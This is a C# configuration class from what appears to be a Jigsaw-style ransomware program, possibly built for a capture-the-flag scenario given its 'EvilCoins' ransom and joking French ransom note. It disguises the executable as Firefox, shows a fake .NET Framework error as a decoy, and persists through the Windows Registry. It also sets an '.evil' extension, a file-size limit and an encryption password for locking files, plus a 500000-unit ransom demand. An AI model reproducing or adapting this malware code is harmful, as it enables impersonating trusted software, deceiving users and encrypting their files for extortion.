using System;
using System.IO;
using Main.Tools;

namespace Main
{
	internal static class Config
	{
		internal enum StartModeType
		{
			Debug,
			ErrorMessage,
			NothingHappens,
			DeleteItself
		}

		internal const string AssemblyProdutAndTitle = "Firefox";

		internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";

		internal const string AssemblyVersion = "37.0.2.5583";

		internal const string EncryptionFileExtension = ".evil";

		internal const int MaxFilesizeToEncryptInBytes = 10000000;

		internal const string EncryptionPassword = "RXZpbERlZmF1bHRQYXNzIQ==";

		internal static StartModeType StartMode;

		internal static string ErrorMessage;

		internal static string ErrorTitle;

		internal static Main.Tools.Windows.StartupMethodType StartupMethod;

		internal static string TempExeRelativePath;

		internal static string TempExePath;

		internal static string FinalExeRelativePath;

		internal static string FinalExePath;

		internal static string WorkFolderRelativePath;

		internal static string WorkFolderPath;

		internal static bool OnlyRunAfterSysRestart;

		internal static DateTime ActiveAfterDateTime;

		internal static bool Activated;

		internal static int TimerActivateCheckerInterval;

		internal static string WelcomeMessage;

		internal static string TaskMessage;

		internal static int RansomUsd;

		static Config()
		{
			Activated = false;
			TimerActivateCheckerInterval = 6000;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			StartMode = StartModeType.ErrorMessage;
			ActiveAfterDateTime = new DateTime(2016, 1, 1);
			ErrorMessage = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine + ".NET Framework, Version = 4.5.1";
			ErrorTitle = ".NET Framework Initialization Error";
			StartupMethod = Main.Tools.Windows.StartupMethodType.Registry;
			TempExeRelativePath = "Drpbx\\drpbx.exe";
			FinalExeRelativePath = "Frfx\\firefox.exe";
			FinalExePath = Path.Combine(folderPath, FinalExeRelativePath);
			TempExePath = Path.Combine(folderPath2, TempExeRelativePath);
			WorkFolderRelativePath = "System32Work\\";
			WorkFolderPath = Path.Combine(folderPath, WorkFolderRelativePath);
			if (!Directory.Exists(WorkFolderPath))
			{
				Directory.CreateDirectory(WorkFolderPath);
			}
			OnlyRunAfterSysRestart = false;
			WelcomeMessage = "Que les choses soient bien claires, nous ne tolérons aucune entrave à notre plan" + Environment.NewLine + "Votre action de résistance est vaine et dénuée de sens" + Environment.NewLine + "Nous vous détruirons sans pitié, vous et vos idées révolutionnaires" + Environment.NewLine + "Vous avez peut-être deviné notre plan, mais vous ne parviendrez pas à le transmettre à la coalition internationale" + Environment.NewLine + Environment.NewLine + "Vos preuves ont été chiffrées et sont désormais inaccessibles mouhahahaha" + Environment.NewLine + "Vous pouvez toujours essayer de payer la rançon, vous ne retrouverez rien";
			RansomUsd = 500000;
			TaskMessage = "Envoyez " + RansomUsd + " EvilCoins ici:";
		}
	}
}
